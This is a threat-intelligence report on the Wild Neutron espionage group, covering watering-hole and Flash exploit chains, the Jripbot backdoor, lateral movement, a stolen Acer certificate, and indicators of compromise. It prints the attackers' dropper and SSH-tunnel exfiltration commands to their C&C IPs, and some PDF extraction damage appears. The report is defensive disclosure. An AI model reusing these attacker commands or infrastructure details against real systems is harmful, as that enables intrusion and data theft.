This attack took advantage of a Java zero-day exploit and used hacked forums as\n\nwatering holes. The 2013 incident was highly publicized and, in the aftermath, the threat actor went dark\n\nfor almost one year.\n\n#WildNeutron is a powerful entity engaged in espionage, possibly for economic reasons\n\n[Tweet](https://twitter.com/share?url=https%3A%2F%2Fsecurelist.com%2Fblog%2Fresearch%2F71275%2Fwild-neutron-economic-espionage-threat-actor-returns-with-new-tricks%2F&text=%23WildNeutron+is+a+powerful+entity+engaged+in+espionage%2C+possibly+for+economic+reasons)\n\nIn late 2013 and early 2014 the attacks resumed and continued throughout 2015. Targets of the new\n\nattacks include:\n\nLaw firms\n\nBitcoin-related companies\n\nInvestment companies\n\nLarge company groups often involved in M&A deals\n\nIT companies\n\nHealthcare companies\n\nReal estate companies\n\nIndividual users\n\nThe focus of these attacks suggests this is not a nation-state sponsored actor. However, the use of zero\ndays, multi-platform malware as well as other techniques makes us believe it’s a powerful entity engaged\n\nin espionage, possibly for economic reasons.\n\n## Older (2013) campaigns\n\nDuring the 2013 attacks, the Wild Neutron actor successfully compromised and leveraged the website\n\n\n-----\n\nThe attackers injected a script into the forum that redirected visitors to another website\n\n(min.liveanalytics[.]org – currently SINKHOLED by Kaspersky Lab) that hosted a Java zero-day\n\nexploit. A similar attack was also found in another forum dedicated to Linux developers:\n\n**[fedoraforum[.]org. For a more detailed analysis of these 2013 attacks, see Eric Romang’s blog.](http://eromang.zataz.com/2013/02/20/facebook-apple-twitter-watering-hole-attack-additional-informations/)**\n\nOther forums compromised by the Wild Neutron group and identified by reports from the Kaspersky\n\nSecurity Network include:\n\nexpatforum.com\n\nmygsmindia.com\n\nforum.samdroid.net\n\nemiratesmac.com\n\nforums.kyngdvb.com\n\ncommunity.flexispy.com\n\nansar1.info\n\nIn particular, two of these stand out: “community.flexispy[.]com” and “ansar1[.]info“. The first one\n\nis a community ran by Flexispy, a company that sells spyware for mobile devices. The second one is a\n\nJihadist forum that is currently closed.\n\n\n-----\n\n**_ansar1[.]info was injected by Wild Neutron in 2013_**\n\nBack in 2013, the attackers also leveraged a Mac OS X backdoor, known as OSX/Pintsized. This is also\n\n[described in more detail in Eric Romang’s excellent blog. The same backdoor, compiled for Win32, is still](http://eromang.zataz.com/2013/03/24/osx-pintsized-backdoor-additional-details/)\n\nbeing used in the 2015 attacks.\n\n#WildNeutron is one of the most unusual APT group we've analysed and tracked\n\n[Tweet](https://twitter.com/share?url=https%3A%2F%2Fsecurelist.com%2Fblog%2Fresearch%2F71275%2Fwild-neutron-economic-espionage-threat-actor-returns-with-new-tricks%2F&text=%23WildNeutron+is+one+of+the+most+unusual+APT+group+we%27ve+analysed+and+tracked)\n\nSome of the more prominent victims of the 2013 attack include Twitter, Facebook, Apple and Microsoft.\n\n[These breaches were covered widely by the press and some affect companies, issued statements on the](http://www.reuters.com/article/2013/02/19/us-apple-hackers-idUSBRE91I10920130219)\n\n[incident (see Facebook’s statement).](https://www.facebook.com/notes/facebook-security/protecting-people-on-facebook/10151249208250766)\n\nThe targeting of major IT companies like Facebook, Twitter, Apple and Microsoft is unusual, however, it’s\n\nnot entirely unique. The lack of victims in other sectors, such as diplomatic or government institutions, is\n\nhowever quite unusual. This makes us believe this is not a nation-state sponsored attack.\n\n## Technical analysis\n\n\n-----\n\nA main backdoor module that initiates the first communication with C&C server\n\nSeveral information gathering modules\n\nExploitation tools\n\nSSH-based exfiltration tools\n\nIntermediate loaders and droppers that decrypt and run the payloads\n\nAlthough customized, some of the modules seem to be heavily based on open source tools (e.g. the\n\npassword dumper resembles the code of Mimikatz and Pass-The-Hash Toolkit) and commercial malware\n\n(HTTPS proxy module is practically identical to the one that is used by Hesperbot).\n\nAlthough customized, some of the modules seem to be heavily based on open source tools\n\n#WildNeutron\n\n[Tweet](https://twitter.com/share?url=https%3A%2F%2Fsecurelist.com%2Fblog%2Fresearch%2F71275%2Fwild-neutron-economic-espionage-threat-actor-returns-with-new-tricks%2F&text=Although+customized%2C+some+of+the+modules+seem+to+be+heavily+based+on+open+source+tools+%23WildNeutron)\n\nAll C&C communication is encrypted with a custom protocol. Dropped executables, as well as some of the\n\nhardcoded strings are usually obfuscated with XOR (depends on bot version). The main backdoor module\n\ncontains a number of evasion techniques, designed to detect or time out sandboxes and emulation\n\nengines.\n\n### Exploitation – 2015\n\nThe initial infection vector from the 2014-2015 attacks is still unknown, although there are clear\n\nindications that the victims are exploited by a kit that leverages an unknown Flash Player exploit.\n\nThe following exploitation chain was observed in one of the attacks:\n\n**Site** hxxp://cryptomag.mediasource.ch/\n\n/favicon.ico\n/msie9html5.jpg\n/loader-large.gif\n/bootstrap.min.css\n/stats.js?d=1434374526478\n\n**Paths** /autoload.js?styleid=20&langid=5&sid=883f2efa&d=1434374526\n\n/banner.html?styleid=19&langid=23&sid=883f2efa&d=1434374526\n/883f2efa/bniqligx.swf?styleid=4&langid=6&sid=883f2efa&d=1434374533\n/883f2efa/pzixfgne?styleid=5&langid=25&sid=883f2efa&d=1434374533\n/883f2efa/bniqligx.swf?styleid=4&langid=6&sid=883f2efa&d=1434374533/\n/background.jpg\n\nThe subdomain cryptomag.mediasource[.]ch appears to have been created for this attack; it pointed\n\nto an IP address associated with other Wild Neutron C&Cs, highlighted in red below:\n\n|Site|hxxp://cryptomag.mediasource.ch/|\n|---|---|\n|Paths|/favicon.ico /msie9html5.jpg /loader-large.gif /bootstrap.min.css /stats.js?d=1434374526478 /autoload.js?styleid=20&langid=5&sid=883f2efa&d=1434374526 /banner.html?styleid=19&langid=23&sid=883f2efa&d=1434374526 /883f2efa/bniqligx.swf?styleid=4&langid=6&sid=883f2efa&d=1434374533 /883f2efa/pzixfgne?styleid=5&langid=25&sid=883f2efa&d=1434374533 /883f2efa/bniqligx.swf?styleid=4&langid=6&sid=883f2efa&d=1434374533/ /background.jpg|\n\n\n-----\n\n**_Hosts resolving to 66.55.133[.]89_**\n\nWhile app.cloudprotect[.]eu and ssl.cloudprotect[.]eu are two known Wild Neutron C&Cs,\n\ncryptomag.mediasource[.]ch appears to have been pointed to this IP for the purpose of exploitation.\n\nAnother suspicious domain can be observed above, secure.pdf-info[.]com. We haven’t seen any attacks\n\nconnected with his hostname yet, however, the name scheme indicates this is also malicious.\n\nIn another attack, we observed a similar exploitation chain, however hosted on a different website,\n\nhxxp://find.a-job.today/.\n\nIn both cases, the visitors browsed the website, or arrived via what appears to have been an online\n\nadvertisement. From there, “autoload.js” appears in both cases, which redirects to another randomly\n\nnamed HTML file, which eventually loads a randomly named SWF file.\n\nWhile the group used watering hole attacks in 2013, it’s still unclear how victims get redirected to the\n\nexploitation kits in the new 2014-2015 attacks. Instead of Flash exploits, older Wild Neutron exploitation\n\nand watering holes used what was a Java zero-day at the end of 2012 and the beginning of 2013, detected\n\nby Kaspersky Lab products as Exploit.Java.CVE-2012-3213.b.\n\n### The main malware dropper\n\nThe functionality of the main dropper is relatively simple: it decrypts the backdoor executable (stored as a\n\nresource and encrypted with a simple XOR 0x66), writes it to a specified path and then executes it with\n\nparameters that are hardcoded in the dropper body. One of the parameters is the URL address of the C&C\n\nserver, while others contain various bot configuration options.\n\nExample parameters used by the dropper:\n\nigfxupt.exe https://app.cloudprotect[.]eu:443 /opts resolv=logs.cloudprotect[.]eu\n\n\n-----\n\nnumbers several times before renaming and removing the file.\n\n### The main backdoor (aka “Jripbot”)\n\nThis binary is executed with the URL address of the C&C server as a parameter; it can also receive an\n\noptional bot configuration. This information is then double-encrypted – first with RC4 and then with\n\nWindows CryptProtectData function – and saved to the registry.\n\nBefore performing any other activity, the malware first runs its stalling code (designed to outrun the\n\nemulators), then performs several anti-sandboxing checks and enters an infinite loop if any unwanted\n\nsoftware running in the system is detected.\n\nOtherwise, it gathers some basic system information:\n\nVersion of the operating system\n\nIf program is running under WOW64\n\nIf current user has administrator privileges\n\nWhich security features of Windows are enabled\n\nUsername and computer name\n\nServer name and LAN group\n\nInformation about logical drives\n\nSystem uptime and idle time\n\nDefault web browser\n\nProxy settings\n\nBased on some of this information, malware generates a unique ID for the victim and starts the C&C\n\ncommunication by sending the ID value and awaiting commands.\n\nBackdoor configuration options may include proxy server address and credentials, sleeptime/delay values\n\nand connection type, but the most interesting option is the resolv=[url] option. If this option is set, the\n\nmalware generates a domain name consisting of computer name, unique ID and and the URL passed with\n\nthis option; then it tries to resolve the IP address of this domain. We suspect this is the method the\n\nattackers use to send the generated UID to the C&C.\n\nCommands from the C&C may instruct the bot to perform following actions:\n\nChange the current directory to the requested one\n\nExecute an arbitrary command in the command line\n\nSet the autorun value for itself in the registry\n\n\n-----\n\nShred requested file (overwrite the file content with random numbers, overwrite the file name with\n\nzeroes and then delete it)\n\nDownload file from the Internet and save it (optionally encrypted) to the disk\n\nInstall or uninstall additional malware plugins\n\nCollect and send system information\n\nEnumerate drives\n\nSet sleeptime value\n\nUpdate the configuration\n\nUpdate itself\n\nQuit\n\nOlder versions of this backdoor, used in the 2013 attacks, had a bit more functionality:\n\nPassword harvesting\n\nPort scanning\n\nCollecting screenshots\n\nPushing files to C&C\n\nReverse shell\n\nThese features were removed from the newer backdoor versions that are used in recent attacks. Instead,\n\nmalware developers decided to implement a plugin mechanism and run different tools for different tasks.\n\nThis suggests a clear shift towards more flexible modular architecture.\n\n#WildNeutron hide the C&C address by encrypting it in the registry with machine-dependent\n\ninformation\n\n[Tweet](https://twitter.com/share?url=https%3A%2F%2Fsecurelist.com%2Fblog%2Fresearch%2F71275%2Fwild-neutron-economic-espionage-threat-actor-returns-with-new-tricks%2F&text=%23WildNeutron+hide+the+C%26amp%3BC+address+by+encrypting+it+in+the+registry+with+machine-dependent+information+)\n\nIn terms of functionality, the main backdoor is no different from many other Remote Access Tools (RATs).\n\nWhat really stands out is the attacker’s carefulness to hide the C&C address, by encrypting it in the registry\n\nwith machine-dependent information. Also notable is the ability to recover from a C&C shutdown by\n\ncontacting a dynamically generated domain name, which only the attackers know in advance, as it is\n\ndirectly tied to each unique victim.\n\nAccording to the timestamp of the samples the distribution is as follows:\n\n\n-----\n\nEach backdoor appears to contain an internal version number, which ranges from 11000 to 16000 in the\n\nlatest samples. This allows us to trace the following evolutionary map:\n\nBackdoors used in the 2013 attacks:\n\n**MD5** **Timestamp** **Version** **Filename** **Size**\n\n1582d68144de2808b518934f0a02bfd6 29 Nov 2012 **11000** javacpl.exe 327168\n\n14ba21a3a0081ef60e676fd4945a8bdc 30 Nov 2012 **12000** javacpl.exe 329728\n\n0fa3657af06a8cc8ef14c445acd92c0f 09 Jan 2013 **13000** javacpl.exe 343552\n\nBackdoors used in 2014 and 2015 attacks:\n\n**MD5** **Timestamp** **Version** **Filename** **Size**\n\n95ffe4ab4b158602917dd2a999a8caf8 13 Dec 2013 **14014** LiveUpdater.exe 302592\n\n342887a7ec6b9f709adcb81fef0d30a3 20 Jun 2014 **15013** FlashUtil.exe 302592\n\n02 Aug 2013\n\ndee8297785b70f490cc00c0763e31b69 (possibly **16010** IgfxUpt.exe 291328\n\nfake)\n\nf0fff29391e7c2e7b13eb4a806276a84 27 Oct 2014 **16017** RtlUpd.exe 253952\n\nThe installers also have a version number, which indicates the following evolution:\n\n**MD5** **Timestamp** **Version**\n\n1f5f5db7b15fe672e8db091d9a291df0 16 Dec 2011 1.4.1\n\n8 66 d 8f6 f d 6f b 8 8 S\n\n|MD5|Timestamp|Version|Filename|Size|\n|---|---|---|---|---|\n|1582d68144de2808b518934f0a02bfd6|29 Nov 2012|11000|javacpl.exe|327168|\n|14ba21a3a0081ef60e676fd4945a8bdc|30 Nov 2012|12000|javacpl.exe|329728|\n|0fa3657af06a8cc8ef14c445acd92c0f|09 Jan 2013|13000|javacpl.exe|343552|\n\n|MD5|Timestamp|Version|Filename|Size|\n|---|---|---|---|---|\n|95ffe4ab4b158602917dd2a999a8caf8|13 Dec 2013|14014|LiveUpdater.exe|302592|\n|342887a7ec6b9f709adcb81fef0d30a3|20 Jun 2014|15013|FlashUtil.exe|302592|\n|dee8297785b70f490cc00c0763e31b69|02 Aug 2013 (possibly fake)|16010|IgfxUpt.exe|291328|\n|f0fff29391e7c2e7b13eb4a806276a84|27 Oct 2014|16017|RtlUpd.exe|253952|\n\n|MD5|Timestamp|Version|\n|---|---|---|\n|1f5f5db7b15fe672e8db091d9a291df0|16 Dec 2011|1.4.1|\n\n\n-----\n\nee24a7ad8d137e54b854095188de0bbf 07 Jan 2014 1.6.4\n\n### Lateral movement\n\nAfter installing the main backdoor and establishing initial C2 communication, the attackers use a range of\n\ndifferent tools to extract sensitive data and control the victim’s machine. These tools include a password\n\nharvesting trojan, a reverse-shell backdoor and customized implementations of OpenSSH, WMIC and\n\nSMB. Sometimes, they only drop a simple perl reverse shell and use various collection methods to retrieve\n\ncredentials from a set of machines, escalate privileges, and fan out across a network from there. Besides\n\nthese tools, there is also a number of small utility modules of different functionalities, from loaders and\n\nconfiguration tools, to file shredders and network proxies.\n\nIt’s also worth noting that this threat actor heavily relies on already existing code, using publicly available\n\nopen source applications, as well as Metasploit tools and leaked malware sources, to build its own toolset.\n\nSome of these tools are designed to work under Cygwin and come together with the Cygwin API DLL,\n\nwhich may suggest that the attackers feel more comfortable when working in a Linux-like environment.\n\n### SSH tunnel backdoor\n\nDuring the 2014/2015 attacks, we observed the attackers deploying custom, OpenSSH-based Win32\n\ntunnel backdoors that are used to exfiltrate large amounts of data in a reliable manner. These tunnel\n\nbackdoors are written as “updt.dat” and executed with two parameters, -z and -p. These specify the IP to\n\nconnect to and the port. Despite the port number 443, the connection is SSH:\n\n/d /u /c updt.dat -z 185.10.58.181 -p 443\n\n/d /u /c updt.dat -z 46.183.217.132 -p 443\n\n/d /u /c updt.dat -z 217.23.6.13 -p 443\n\nFor authentication, the SSH tunnel backdoor contains a hardcoded RSA private key.\n\n### Stolen certificate\n\nDuring the 2015 attacks, Wild Neutron used a dropper signed with a stolen, yet valid Acer Incorporated\n\ncertificate.\n\n\n-----\n\n**_Acer signature on Wild Neutron dropper_**\n\nThe abused certificate has the following properties:\n\n**Serial: 5c c5 3b a3 e8 31 a7 df dc 7c 28 d5 15 8f c3 80**\n\n**Thumbprint: 0d 85 91 41 ee 9a 0c 6e 72 5f fe 6b cf c9 9f 3e fc c3 fc 07**\n\nThe dropper (dbb0ea0436f70f2a178a60c4d8b791b3) appears to have been signed on June 15, 2015. It\n\ndrops a Jripbot backdoor as “IgfxUpt.exe” and configures it to use the C&C “app.cloudprotect[.]eu”.\n\n#WildNeutron used a dropper signed with a stolen, yet valid Acer Incorporated certificate\n\n[Tweet](https://twitter.com/share?url=https%3A%2F%2Fsecurelist.com%2Fblog%2Fresearch%2F71275%2Fwild-neutron-economic-espionage-threat-actor-returns-with-new-tricks%2F&text=%23WildNeutron+used+a+dropper+signed+with+a+stolen%2C+yet+valid+Acer+Incorporated+certificate)\n\nWe have worked with Symantec, Verisign and Acer to revoke the compromised certificate.\n\n## Victims and statistics\n\nThe Wild Neutron attacks appear to have a highly targeted nature. During our investigation, we have been\n\nable to identify several victims across 11 countries and territories:\n\n\n-----\n\nRussia\n\nSwitzerland\n\nGermany\n\nAustria\n\nPalestine\n\nSlovenia\n\nKazakhstan\n\nUAE\n\nAlgeria\n\nUnited States\n\n\n-----\n\ncases, a small number of computers have been infected throughout the organizations. The attackers\n\nappear to have updated the malware implant and deployed some additional tools, however, we haven’t\n\nobserved serious lateral movement in these cases.\n\n## Attribution\n\nThe targeting of various companies, without a government focus, makes us believe this is not a nation\n\nstate sponsored APT. The attackers have also shown an interest in investment related targets, which\n\nindicate knowledge and skills to exploit such information on the market to turn it into financial\n\nadvantages.\n\nIn some of the samples, the encrypted configuration includes a Romanian language string\n\n#WildNeutron\n\n[Tweet](https://twitter.com/share?url=https%3A%2F%2Fsecurelist.com%2Fblog%2Fresearch%2F71275%2Fwild-neutron-economic-espionage-threat-actor-returns-with-new-tricks%2F&text=In+some+of+the+samples%2C+the+encrypted+configuration+includes+a+Romanian+language+string+%23WildNeutron)\n\nIn some of the samples, the encrypted configuration includes a Romanian language string, which is used\n\nto mark the end of the C&C communication:\n\nInterestingly, “La revedere” means “goodbye” in Romanian.

Contact: intelreports@kaspersky.com**\n\n## Conclusions\n\nCompared to other APT groups, Wild Neutron is one of the most unusual ones we’ve analysed and tracked.\n\nActive since 2011, the group has been using at least one zero-day exploit, custom malware and tools and\n\nmanaged to keep a relatively solid opsec which so far eluded most attribution efforts. Their targeting of\n\nmajor IT companies, spyware developers (FlexiSPY), jihadist forums (the “Ansar Al-Mujahideen English\n\nForum”) and Bitcoin companies indicate a flexible yet unusual mindset and interests.\n\nSome of group’s distinctive features include:\n\nUse of open source tools and leaked sources of other malware\n\nUse of stolen certificate from Acer Incorporated to sign malware\n\nUse of cross platform zero-day exploit (Java and Flash) followed by cross platform payload reverse\n\nshell (Perl) for initial penetration\n\nUse of *NIX code ported to Windows through Cygwin\n\nHeavy use of SSH for exfiltration, a commonly used *NIX administration tool\n\nUse of CryptProtectData API to keep C&C URLs secret\n\nSimple command line interface, built around all malware components, utilizing named pipes for\n\ncommunication between modules;\n\nAuxiliary tools are written in C and most of them contain a built-in help, which may be printed by\n\nexecuting the binary with a “–pleh” parameter\n\nWe continue to track the Wild Neutron group, which is still active as of June 2015.\n\nKaspersky products detect the malware used in the attacks as: HEUR:Trojan.Win32.WildNeutron.gen,\n\nTrojan.Win32.WildNeutron.*, Trojan.Win32.JripBot.*, HEUR:Trojan.Win32.Generic\n\nRead more about how Kaspersky Lab products can help to protect you from Wild Neutron threat actor\n\nhere:\n\n[Wild Neutron in the wild: perhaps you’re his next prey](https://business.kaspersky.com/wildneutron-in-the-wild-perhaps-youre-his-next-prey/4169)\n\n## Indicators of Compromise (IOCs)\n\n### Known malicious hostnames and domains:\n\n\n-----\n\nupdatesoft.eu\n\napp.cloudprotect.eu\n\nfw.ddosprotected.eu\n\nlogs.cloudprotect.eu\n\nssl.cloudprotect.eu\n\nssl.updatesoft.eu\n\nadb.strangled.net\n\ndigitalinsight-ltd.com\n\nads.digitalinsight-ltd.com\n\ncache.cloudbox-storage.com\n\ncloudbox-storage.com\n\nclust12-akmai.net\n\ncorp-aapl.com\n\nfb.clust12-akmai.net\n\nfbcbn.net\n\nimg.digitalinsight-ltd.com\n\njdk-update.com\n\nliveanalytics.org\n\nmin.liveanalytics.org\n\npop.digitalinsight-ltd.com\n\nww1.jdk-update.com\n\nfind.a-job.today\n\ncryptomag.mediasource.ch\n\n### Known malicious IPs:\n\n185.10.58.181\n\n46.183.217.132\n\n64.187.225.231\n\n62.113.238.104\n\n66.55.133.89\n\n217.23.6.13\n\n### Known file names:\n\n%APPDATA%\\Roaming\\FlashUtil.exe\n\n%APPDATA%\\Roaming\\Acer\\LiveUpdater.exe\n\n\n-----\n\n%ProgramData%\\Realtek\\RtlUpd.exe\n\n%APPDATA%\\Roaming\\sqlite3.dll (UPX packed)\n\n%WINDIR%\\winsession.dll\n\n%APPDATA%\\appdata\\local\\temp\\teamviewer\\version9\\update.exe\n\n%SYSTEMROOT%\\temp\\_dbg.tmp\n\n%SYSTEMROOT%\\temp\\ok.tmp\n\nC:\\windows\\temp\\debug.txt\n\nC:\\windows\\syswow64\\mshtaex.exe\n\n%SYSROOT%\\System32\\mshtaex.exe\n\n%SYSROOT%\\System32\\wdigestEx.dll\n\n%SYSROOT%\\System32\\dpcore16t.dll\n\n%SYSROOT%\\System32\\iastor32.exe\n\n%SYSROOT%\\System32\\mspool.dll\n\n%SYSROOT%\\System32\\msvcse.exe\n\n%SYSROOT%\\System32\\mspool.exe\n\nC:\\Program Files (x86)\\LNVSuite\\LnrAuth.dll\n\nC:\\Program Files (x86)\\LNVSuite\\LnrAuthSvc.dll\n\nC:\\Program Files (x86)\\LNVSuite\\LnrUpdt.exe\n\nC:\\Program Files (x86)\\LNVSuite\\LnrUpdtP.exe\n\nDF39527~.tmp\n\n### Named pipes:\n\n\\\\.\\pipe\\winsession \\\\.\\pipe\\lsassw\n\n### Events & mutexes:\n\nGlobal\\LnrRTPDispatchEvents _Winlogon_TCP_Service\n\n\n-----",
